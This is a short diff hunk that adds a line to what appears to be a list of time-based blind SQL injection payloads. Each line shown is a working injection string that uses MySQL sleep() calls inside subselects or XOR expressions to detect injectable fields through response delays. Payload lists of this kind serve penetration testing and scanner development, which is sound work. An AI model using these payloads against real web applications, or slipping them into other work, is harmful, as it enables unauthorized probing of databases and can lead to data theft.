@@ -99,5 +99,6 @@ latest:
 
 
 '+(select*from(select(sleep(7)))a)+'
+'XOR(if(1=1,sleep(3),0))XOR'
 'XOR(select*from(select(sleep(7)))a)XOR'Z--%20-+
 'and+(select*from(select(sleep(4)))a)+--+
